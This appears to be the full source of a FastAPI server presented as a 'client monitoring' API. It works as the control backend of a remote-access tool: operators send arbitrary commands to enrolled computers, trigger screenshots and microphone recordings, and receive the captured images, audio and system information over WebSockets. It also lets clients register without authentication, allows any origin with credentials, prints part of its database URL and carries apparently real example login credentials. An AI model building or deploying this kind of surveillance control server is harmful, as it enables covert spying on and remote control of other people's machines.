import os
import sys
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel, Field
from typing import List, Dict, Optional, Any
from datetime import datetime, timedelta
import secrets
import json
import jwt
import base64
import asyncio
import psycopg2
from psycopg2.extras import RealDictCursor

# Load environment variables


# Create FastAPI app
app = FastAPI(
    title="Cyber Monitor Control API",
    version="3.0",
    description="Client monitoring and management system",
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_url="/openapi.json"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))
DATABASE_URL = os.getenv("DATABASE_URL", "")

# Database connection
db_conn = None

# Security
security = HTTPBearer()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="kizer")
    password: str = Field(..., example="kidraper67")

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001")
    name: str = Field(..., example="Office Computer")
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Windows", example="Windows 11")

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    command: str = Field(..., example="get_processes")
    parameters: Dict[str, Any] = Field(default_factory=dict)

class ScreenshotUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    image_data: str = Field(..., description="Base64 encoded image")
    filename: str = Field(..., example="screenshot_2024.png")

class AudioUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    audio_data: str = Field(..., description="Base64 encoded audio")
    filename: str = Field(..., example="recording_2024.mp3")

class LogEntry(BaseModel):
    client_id: str = Field(..., example="client-001")
    log_type: str = Field(..., example="info")
    message: str = Field(..., example="System started")

# ========== SECURITY FUNCTIONS ==========
def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str) -> Optional[dict]:
    """Verify JWT token"""
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.PyJWTError:
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    """Verify JWT token from request"""
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== DATABASE FUNCTIONS ==========
def get_db_connection():
    """Get database connection"""
    global db_conn
    
    if db_conn is None or db_conn.closed:
        try:
            # Get connection string from environment
            db_url = os.getenv("DATABASE_URL") or os.getenv("SUPABASE_DB_URL")
            
            if not db_url:
                print("⚠️ No database URL provided")
                return None
            
            # Debug: Print the URL (remove this in production)
            print(f"🔧 Database URL: {db_url[:50]}...")
            
            # Ensure proper connection string format
            # Supabase typically uses: postgresql://postgres:[YOUR-PASSWORD]@[YOUR-HOST]:5432/postgres
            if not db_url.startswith("postgresql://") and not db_url.startswith("postgres://"):
                print(f"❌ Invalid database URL format. Must start with 'postgresql://' or 'postgres://'")
                return None
            
            # Connect to database
            db_conn = psycopg2.connect(
                db_url,
                cursor_factory=RealDictCursor,
                connect_timeout=10  # 10 second timeout
            )
            print(f"✅ Database connected successfully")
            return db_conn
            
        except psycopg2.OperationalError as e:
            print(f"❌ Database connection failed: {e}")
            return None
        except Exception as e:
            print(f"❌ Unexpected database error: {e}")
            return None
    
    return db_conn

def verify_password_sql(email: str, password: str) -> bool:
    """Verify password using PostgreSQL crypt function"""
    conn = get_db_connection()
    if not conn:
        print("❌ No database connection for password verification")
        return False
    
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT password_hash = crypt(%s, password_hash) as password_match
            FROM users 
            WHERE email = %s AND is_active = true
        """, (password, email))
        
        result = cursor.fetchone()
        conn.commit()
        
        if result and result['password_match']:
            print(f"✅ Password verified for user: {email}")
            return True
        else:
            print(f"❌ Password verification failed for user: {email}")
            return False
            
    except Exception as e:
        print(f"❌ Password verification error: {e}")
        return False

def get_user_by_email(email: str):
    """Get user by email"""
    conn = get_db_connection()
    if not conn:
        return None
    
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, email, is_admin, last_login
            FROM users 
            WHERE email = %s AND is_active = true
        """, (email,))
        
        user = cursor.fetchone()
        conn.commit()
        return user
    except Exception as e:
        print(f"❌ Get user error: {e}")
        return None

def update_last_login(user_id: str):
    """Update user's last login time"""
    conn = get_db_connection()
    if not conn:
        return
    
    try:
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE users 
            SET last_login = NOW() 
            WHERE id = %s
        """, (user_id,))
        conn.commit()
        print(f"✅ Updated last login for user: {user_id}")
    except Exception as e:
        print(f"❌ Update last login error: {e}")

def get_client_id_from_db(client_identifier: str):
    """Get client database ID from client_id"""
    conn = get_db_connection()
    if not conn:
        return None
    
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id FROM clients WHERE client_id = %s
        """, (client_identifier,))
        
        result = cursor.fetchone()
        conn.commit()
        return result['id'] if result else None
    except Exception as e:
        print(f"❌ Get client ID error: {e}")
        return None

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections.append(websocket)
        print(f"👑 Admin connected. Total admins: {len(self.admin_connections)}")

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        print(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
        
        # Update client status in database
        conn = get_db_connection()
        if conn:
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    UPDATE clients 
                    SET online = true, last_seen = NOW()
                    WHERE client_id = %s
                """, (client_id,))
                conn.commit()
            except Exception as e:
                print(f"⚠️ Client status update error: {e}")
        
        # Notify admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat()
        })

    def disconnect(self, websocket: WebSocket):
        # Remove from admin connections
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
            print(f"👑 Admin disconnected. Total admins: {len(self.admin_connections)}")
        
        # Remove from client connections
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            print(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
            
            # Update client status in database
            conn = get_db_connection()
            if conn:
                try:
                    cursor = conn.cursor()
                    cursor.execute("""
                        UPDATE clients 
                        SET online = false
                        WHERE client_id = %s
                    """, (client_id,))
                    conn.commit()
                except Exception as e:
                    print(f"⚠️ Client status update error: {e}")
            
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat()
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                print(f"❌ Failed to send to admin: {e}")
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict) -> bool:
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                print(f"❌ Failed to send to client {client_id}: {e}")
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False

manager = ConnectionManager()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint"""
    try:
        print(f"🔐 Login attempt for user: {data.email}")
        
        # Verify password using PostgreSQL crypt function
        if not verify_password_sql(data.email, data.password):
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Get user details
        user = get_user_by_email(data.email)
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        
        print(f"✅ User authenticated: {user['email']}")
        
        # Create JWT token
        token_data = {
            "sub": user["email"],
            "email": user["email"],
            "is_admin": user.get("is_admin", False),
            "user_id": str(user["id"])
        }
        access_token = create_jwt_token(token_data)
        
        # Update last login
        update_last_login(user["id"])
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user["email"],
                "is_admin": user.get("is_admin", False)
            }
        }
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Login error: {str(e)}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        conn = get_db_connection()
        if not conn:
            return {
                "success": True, 
                "message": "Client registered (development mode)",
                "client_id": data.client_id
            }
        
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            data.ip_address = request.client.host if request.client else "Unknown"
        
        cursor = conn.cursor()
        
        # Check if client exists
        cursor.execute("""
            SELECT id FROM clients WHERE client_id = %s
        """, (data.client_id,))
        
        existing_client = cursor.fetchone()
        
        if existing_client:
            # Update existing client
            cursor.execute("""
                UPDATE clients 
                SET name = %s, ip_address = %s, os_info = %s, 
                    last_seen = NOW(), online = true, updated_at = NOW()
                WHERE client_id = %s
                RETURNING id
            """, (
                data.name, data.ip_address, data.os_info, data.client_id
            ))
            client_id = cursor.fetchone()["id"]
            action = "updated"
        else:
            # Create new client
            cursor.execute("""
                INSERT INTO clients (client_id, name, ip_address, os_info, last_seen, online)
                VALUES (%s, %s, %s, %s, NOW(), true)
                RETURNING id
            """, (
                data.client_id, data.name, data.ip_address, data.os_info
            ))
            client_id = cursor.fetchone()["id"]
            action = "registered"
        
        # Add log entry
        try:
            cursor.execute("""
                INSERT INTO logs (client_id, log_type, message)
                VALUES (%s, 'info', %s)
            """, (client_id, f"Client {action}: {data.name} ({data.client_id})"))
        except Exception as e:
            print(f"⚠️ Log insertion error: {str(e)}")
        
        conn.commit()
        
        return {
            "success": True, 
            "message": f"Client {action}",
            "client_id": data.client_id
        }
        
    except Exception as e:
        print(f"❌ Client registration error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/clients", response_model=dict)
async def get_clients(_: dict = Depends(authenticate_user)):
    """Get all clients"""
    try:
        conn = get_db_connection()
        if not conn:
            # Return mock data for development
            mock_clients = [
                {
                    "id": "dev-001",
                    "client_id": "client-001",
                    "name": "Development Client",
                    "ip_address": "192.168.1.100",
                    "os_info": "Windows 11",
                    "online": True,
                    "last_seen": datetime.utcnow().isoformat(),
                    "registered_at": datetime.utcnow().isoformat()
                }
            ]
            return {"success": True, "clients": mock_clients}
        
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, client_id, name, ip_address, os_info, 
                   online, last_seen, registered_at
            FROM clients 
            ORDER BY last_seen DESC NULLS LAST
        """)
        
        clients = cursor.fetchall()
        # Convert datetime objects to ISO format strings
        for client in clients:
            for key in ['last_seen', 'registered_at']:
                if client[key]:
                    client[key] = client[key].isoformat()
        
        return {"success": True, "clients": clients}
    except Exception as e:
        print(f"❌ Get clients error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/client/{client_id}", response_model=dict)
async def get_client(client_id: str, _: dict = Depends(authenticate_user)):
    """Get specific client"""
    try:
        conn = get_db_connection()
        if not conn:
            # Return mock data for development
            mock_client = {
                "id": "dev-001",
                "client_id": client_id,
                "name": "Development Client",
                "ip_address": "192.168.1.100",
                "os_info": "Windows 11",
                "online": True,
                "last_seen": datetime.utcnow().isoformat(),
                "registered_at": datetime.utcnow().isoformat()
            }
            return {"success": True, "client": mock_client}
        
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, client_id, name, ip_address, os_info, 
                   online, last_seen, registered_at
            FROM clients 
            WHERE client_id = %s
        """, (client_id,))
        
        client = cursor.fetchone()
        if not client:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Convert datetime objects to ISO format strings
        for key in ['last_seen', 'registered_at']:
            if client[key]:
                client[key] = client[key].isoformat()
        
        return {"success": True, "client": client}
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Get client error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/commands", response_model=dict)
async def get_commands(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 50
):
    """Get recent commands"""
    try:
        conn = get_db_connection()
        if not conn:
            # Return mock data for development
            mock_commands = [
                {
                    "id": "cmd-001",
                    "client_id": "dev-001",
                    "command": "get_system_info",
                    "parameters": {},
                    "status": "completed",
                    "result": "System information retrieved",
                    "created_at": datetime.utcnow().isoformat(),
                    "completed_at": datetime.utcnow().isoformat()
                }
            ]
            return {"success": True, "commands": mock_commands}
        
        cursor = conn.cursor()
        
        query = """
            SELECT c.id, cl.client_id, cl.name as client_name, 
                   c.command, c.parameters, c.status, c.result, 
                   c.created_at, c.completed_at, c.error
            FROM commands c
            JOIN clients cl ON c.client_id = cl.id
            WHERE 1=1
        """
        
        params = []
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        query += " ORDER BY c.created_at DESC LIMIT %s"
        params.append(limit)
        
        cursor.execute(query, params)
        commands = cursor.fetchall()
        
        # Format the response
        formatted_commands = []
        for cmd in commands:
            formatted_cmd = dict(cmd)
            formatted_cmd["clients"] = {
                "client_id": cmd["client_id"],
                "name": cmd["client_name"]
            }
            # Convert datetime objects
            for key in ['created_at', 'completed_at']:
                if formatted_cmd[key]:
                    formatted_cmd[key] = formatted_cmd[key].isoformat()
            del formatted_cmd["client_name"]
            formatted_commands.append(formatted_cmd)
        
        return {"success": True, "commands": formatted_commands}
    except Exception as e:
        print(f"❌ Get commands error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        conn = get_db_connection()
        if not conn:
            # For development without database
            command_id = f"cmd-dev-{int(datetime.utcnow().timestamp())}"
            
            # Try to send via WebSocket
            sent = await manager.send_to_client(data.client_id, {
                "type": "command",
                "command_id": command_id,
                "command": data.command,
                "parameters": data.parameters
            })
            
            return {
                "success": True,
                "command_id": command_id,
                "sent_via_websocket": sent,
                "message": "Command sent (development mode)"
            }
        
        cursor = conn.cursor()
        
        # Get client database ID
        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
        client_result = cursor.fetchone()
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        db_client_id = client_result['id']
        
        # Create command record
        cursor.execute("""
            INSERT INTO commands (client_id, command, parameters, status)
            VALUES (%s, %s, %s::jsonb, 'pending')
            RETURNING id, created_at
        """, (db_client_id, data.command, json.dumps(data.parameters)))
        
        command_result = cursor.fetchone()
        command_id = str(command_result['id'])
        
        # Try to send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": command_id,
            "command": data.command,
            "parameters": data.parameters
        })
        
        if not sent:
            # Update command status if WebSocket failed
            cursor.execute("""
                UPDATE commands 
                SET status = 'failed', error = 'Client not connected'
                WHERE id = %s
            """, (command_id,))
        
        conn.commit()
        
        return {
            "success": True,
            "command_id": command_id,
            "sent_via_websocket": sent
        }
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Send command error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/screenshots", response_model=dict)
async def get_screenshots(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 12
):
    """Get recent screenshots"""
    try:
        conn = get_db_connection()
        if not conn:
            # Return mock data for development
            mock_screenshots = [
                {
                    "id": "scr-001",
                    "client_id": "dev-001",
                    "filename": "screenshot_2024.png",
                    "created_at": datetime.utcnow().isoformat()
                }
            ]
            return {"success": True, "screenshots": mock_screenshots}
        
        cursor = conn.cursor()
        
        query = """
            SELECT s.id, cl.client_id, cl.name as client_name, 
                   s.filename, s.created_at
            FROM screenshots s
            JOIN clients cl ON s.client_id = cl.id
            WHERE 1=1
        """
        
        params = []
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        query += " ORDER BY s.created_at DESC LIMIT %s"
        params.append(limit)
        
        cursor.execute(query, params)
        screenshots = cursor.fetchall()
        
        # Format the response
        formatted_screenshots = []
        for scr in screenshots:
            formatted_scr = dict(scr)
            formatted_scr["clients"] = {
                "client_id": scr["client_id"],
                "name": scr["client_name"]
            }
            # Convert datetime objects
            if formatted_scr["created_at"]:
                formatted_scr["created_at"] = formatted_scr["created_at"].isoformat()
            del formatted_scr["client_name"]
            formatted_screenshots.append(formatted_scr)
        
        return {"success": True, "screenshots": formatted_screenshots}
    except Exception as e:
        print(f"❌ Get screenshots error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/screenshot/{client_id}", response_model=dict)
async def request_screenshot(client_id: str, _: dict = Depends(authenticate_user)):
    """Request screenshot from client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "screenshot_request",
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if sent:
            return {
                "success": True,
                "message": "Screenshot request sent"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Screenshot request error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-screenshot", response_model=dict)
async def upload_screenshot(data: ScreenshotUpload, _: dict = Depends(authenticate_user)):
    """Upload screenshot from client"""
    try:
        conn = get_db_connection()
        if not conn:
            screenshot_id = f"scr-dev-{int(datetime.utcnow().timestamp())}"
            
            # Notify admins
            await manager.notify_admins({
                "type": "screenshot_received",
                "client_id": data.client_id,
                "screenshot_id": screenshot_id,
                "filename": data.filename,
                "timestamp": datetime.utcnow().isoformat()
            })
            
            return {
                "success": True,
                "screenshot_id": screenshot_id,
                "message": "Screenshot uploaded (development mode)"
            }
        
        cursor = conn.cursor()
        
        # Get client database ID
        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
        client_result = cursor.fetchone()
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        db_client_id = client_result['id']
        
        # Store screenshot
        cursor.execute("""
            INSERT INTO screenshots (client_id, image_data, filename)
            VALUES (%s, %s, %s)
            RETURNING id, created_at
        """, (db_client_id, data.image_data, data.filename))
        
        screenshot_result = cursor.fetchone()
        screenshot_id = str(screenshot_result['id'])
        
        conn.commit()
        
        # Notify admins
        await manager.notify_admins({
            "type": "screenshot_received",
            "client_id": data.client_id,
            "screenshot_id": screenshot_id,
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {"success": True, "screenshot_id": screenshot_id}
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Screenshot upload error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/audio", response_model=dict)
async def get_audio(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 10
):
    """Get recent audio recordings"""
    try:
        conn = get_db_connection()
        if not conn:
            # Return mock data for development
            mock_audio = [
                {
                    "id": "aud-001",
                    "client_id": "dev-001",
                    "filename": "recording_2024.mp3",
                    "created_at": datetime.utcnow().isoformat()
                }
            ]
            return {"success": True, "audio_recordings": mock_audio}
        
        cursor = conn.cursor()
        
        query = """
            SELECT a.id, cl.client_id, cl.name as client_name, 
                   a.filename, a.created_at
            FROM audio_recordings a
            JOIN clients cl ON a.client_id = cl.id
            WHERE 1=1
        """
        
        params = []
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        query += " ORDER BY a.created_at DESC LIMIT %s"
        params.append(limit)
        
        cursor.execute(query, params)
        audio_recordings = cursor.fetchall()
        
        # Format the response
        formatted_audio = []
        for aud in audio_recordings:
            formatted_aud = dict(aud)
            formatted_aud["clients"] = {
                "client_id": aud["client_id"],
                "name": aud["client_name"]
            }
            # Convert datetime objects
            if formatted_aud["created_at"]:
                formatted_aud["created_at"] = formatted_aud["created_at"].isoformat()
            del formatted_aud["client_name"]
            formatted_audio.append(formatted_aud)
        
        return {"success": True, "audio_recordings": formatted_audio}
    except Exception as e:
        print(f"❌ Get audio error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/audio/{client_id}/record", response_model=dict)
async def record_audio(client_id: str, duration: int = 10, _: dict = Depends(authenticate_user)):
    """Request audio recording from client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_record",
            "duration": duration,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if sent:
            return {
                "success": True,
                "message": f"Audio recording requested for {duration} seconds"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Audio record request error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/audio/{client_id}/stop", response_model=dict)
async def stop_audio(client_id: str, _: dict = Depends(authenticate_user)):
    """Stop audio recording on client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_stop",
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if sent:
            return {
                "success": True,
                "message": "Audio recording stopped"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Audio stop error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-audio", response_model=dict)
async def upload_audio(data: AudioUpload, _: dict = Depends(authenticate_user)):
    """Upload audio recording from client"""
    try:
        conn = get_db_connection()
        if not conn:
            audio_id = f"aud-dev-{int(datetime.utcnow().timestamp())}"
            
            # Notify admins
            await manager.notify_admins({
                "type": "audio_received",
                "client_id": data.client_id,
                "audio_id": audio_id,
                "filename": data.filename,
                "timestamp": datetime.utcnow().isoformat()
            })
            
            return {
                "success": True,
                "audio_id": audio_id,
                "message": "Audio uploaded (development mode)"
            }
        
        cursor = conn.cursor()
        
        # Get client database ID
        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
        client_result = cursor.fetchone()
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        db_client_id = client_result['id']
        
        # Store audio
        cursor.execute("""
            INSERT INTO audio_recordings (client_id, audio_data, filename)
            VALUES (%s, %s, %s)
            RETURNING id, created_at
        """, (db_client_id, data.audio_data, data.filename))
        
        audio_result = cursor.fetchone()
        audio_id = str(audio_result['id'])
        
        conn.commit()
        
        # Notify admins
        await manager.notify_admins({
            "type": "audio_received",
            "client_id": data.client_id,
            "audio_id": audio_id,
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {"success": True, "audio_id": audio_id}
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Audio upload error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/logs", response_model=dict)
async def get_logs(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    log_type: Optional[str] = None,
    limit: int = 100
):
    """Get system logs"""
    try:
        conn = get_db_connection()
        if not conn:
            # Return mock data for development
            mock_logs = [
                {
                    "id": "log-001",
                    "client_id": "dev-001",
                    "log_type": "info",
                    "message": "System started successfully",
                    "created_at": datetime.utcnow().isoformat()
                }
            ]
            return {"success": True, "logs": mock_logs}
        
        cursor = conn.cursor()
        
        query = """
            SELECT l.id, cl.client_id, cl.name as client_name, 
                   l.log_type, l.message, l.created_at
            FROM logs l
            JOIN clients cl ON l.client_id = cl.id
            WHERE 1=1
        """
        
        params = []
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        if log_type and log_type != "all":
            query += " AND l.log_type = %s"
            params.append(log_type)
        
        query += " ORDER BY l.created_at DESC LIMIT %s"
        params.append(limit)
        
        cursor.execute(query, params)
        logs = cursor.fetchall()
        
        # Format the response
        formatted_logs = []
        for log in logs:
            formatted_log = dict(log)
            formatted_log["clients"] = {
                "client_id": log["client_id"],
                "name": log["client_name"]
            }
            # Convert datetime objects
            if formatted_log["created_at"]:
                formatted_log["created_at"] = formatted_log["created_at"].isoformat()
            del formatted_log["client_name"]
            formatted_logs.append(formatted_log)
        
        return {"success": True, "logs": formatted_logs}
    except Exception as e:
        print(f"❌ Get logs error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/test-auth", response_model=dict)
async def test_auth(_: dict = Depends(authenticate_user)):
    """Test authentication endpoint"""
    return {
        "success": True,
        "message": "Authentication successful",
        "timestamp": datetime.utcnow().isoformat()
    }

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """WebSocket endpoint for admin dashboard"""
    await manager.connect_admin(websocket)
    try:
        while True:
            data = await websocket.receive_json()
            print(f"👑 Admin WebSocket message: {data}")
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        print(f"❌ Admin WebSocket error: {str(e)}")
        manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for client connections"""
    await manager.connect_client(websocket, client_id)
    try:
        while True:
            data = await websocket.receive_json()
            data_type = data.get("type")
            
            if data_type == "heartbeat":
                # Update last seen
                conn = get_db_connection()
                if conn:
                    try:
                        cursor = conn.cursor()
                        cursor.execute("""
                            UPDATE clients 
                            SET last_seen = NOW(), online = true
                            WHERE client_id = %s
                        """, (client_id,))
                        conn.commit()
                    except:
                        pass
                
            elif data_type == "command_result":
                # Update command status
                conn = get_db_connection()
                if conn:
                    try:
                        cursor = conn.cursor()
                        cursor.execute("""
                            UPDATE commands 
                            SET status = 'completed', result = %s, completed_at = NOW()
                            WHERE id = %s
                        """, (data.get("result"), data.get("command_id")))
                        conn.commit()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "command_id": data.get("command_id"),
                    "result": data.get("result"),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "log":
                # Store log
                conn = get_db_connection()
                if conn:
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (client_id,))
                        client_result = cursor.fetchone()
                        if client_result:
                            cursor.execute("""
                                INSERT INTO logs (client_id, log_type, message)
                                VALUES (%s, %s, %s)
                            """, (client_result['id'], data.get("log_type", "info"), data.get("message", "")))
                            conn.commit()
                    except Exception as e:
                        print(f"⚠️ Log storage error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "client_log",
                    "client_id": client_id,
                    "log_type": data.get("log_type", "info"),
                    "message": data.get("message", ""),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "system_info":
                # Store system info
                conn = get_db_connection()
                if conn:
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (client_id,))
                        client_result = cursor.fetchone()
                        if client_result:
                            cursor.execute("""
                                INSERT INTO system_info (client_id, info)
                                VALUES (%s, %s::jsonb)
                            """, (client_result['id'], json.dumps(data.get("info", {}))))
                            conn.commit()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "system_info",
                    "client_id": client_id,
                    "info": data.get("info", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        print(f"❌ Client WebSocket error: {str(e)}")
        manager.disconnect(websocket)

# ========== HEALTH AND INFO ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    """Health check endpoint"""
    conn = get_db_connection()
    
    health_status = {
        "status": "healthy" if conn else "unhealthy",
        "timestamp": datetime.utcnow().isoformat(),
        "version": "3.0",
        "database": "connected" if conn else "disconnected",
        "active_clients": len(manager.client_connections),
        "active_admins": len(manager.admin_connections),
        "environment": "production"
    }
    
    # Test database connection
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT 1")
            health_status["database"] = "connected"
        except Exception as e:
            health_status["database"] = f"error: {str(e)}"
            health_status["status"] = "degraded"
    
    return health_status

@app.get("/", response_model=dict)
async def root():
    """Root endpoint with API info"""
    conn = get_db_connection()
    
    return {
        "message": "🚀 Cyber Monitor Control API",
        "version": "3.0",
        "status": "running",
        "database": "connected" if conn else "disconnected",
        "timestamp": datetime.utcnow().isoformat(),
        "endpoints": {
            "login": "POST /api/login",
            "register_client": "POST /api/register-client",
            "clients": "GET /api/clients",
            "commands": "GET /api/commands",
            "screenshots": "GET /api/screenshots",
            "audio": "GET /api/audio",
            "logs": "GET /api/logs",
            "health": "GET /api/health",
            "documentation": "/docs"
        },
        "websocket": {
            "admin": "/ws/admin",
            "client": "/ws/client/{client_id}"
        }
    }

# ========== APPLICATION STARTUP ==========
@app.on_event("startup")
async def startup_event():
    """Initialize database on startup"""
    print(f"🚀 Starting Cyber Monitor Control API v3.0")
    print(f"📡 Port: {PORT}")
    
    # Test database connection
